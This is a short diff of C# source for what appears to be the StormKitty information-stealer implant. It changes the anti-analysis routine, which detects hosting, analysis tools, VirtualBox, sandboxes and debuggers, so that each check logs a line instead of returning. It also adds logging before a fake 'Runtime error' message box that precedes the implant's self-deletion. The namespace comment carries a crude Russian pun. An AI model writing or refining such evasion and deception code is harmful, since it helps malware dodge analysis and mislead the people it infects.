@@ -132,12 +132,12 @@ namespace StormKitty.Implant // Анальный
         {
             if (Config.AntiAnalysis == "1")
             {
-                if (Hosting()) return true;
-                if (Processes()) return true;
-                if (VirtualBox()) return true;
-                if (SandBox()) return true;
-                //if (Emulator()) return true;
-                if (Debugger()) return true;
+                if (Hosting()) Logging.Log("AntiAnalysis : Hosting detected!", true);
+                if (Processes()) Logging.Log("AntiAnalysis : Process detected!", true);
+                if (VirtualBox()) Logging.Log("AntiAnalysis : Virtual machine detected!", true);
+                if (SandBox()) Logging.Log("AntiAnalysis : SandBox detected!", true);
+                //if (Emulator())  Logging.Log("AntiAnalysis : Emulator detected!", true);
+                if (Debugger()) Logging.Log("AntiAnalysis : Debugger detected!", true);
             }
             return false;
         }
@@ -149,6 +149,7 @@ namespace StormKitty.Implant // Анальный
         {
             string code = StringsCrypt.GenerateRandomData("1");
             code = "0x" + code.Substring(0, 5);
+            Logging.Log("Sending fake error message box with code: " + code);
             MessageBox.Show("Exit code " + code, "Runtime error",
                 MessageBoxButtons.RetryCancel, MessageBoxIcon.Error);
             SelfDestruct.Melt();
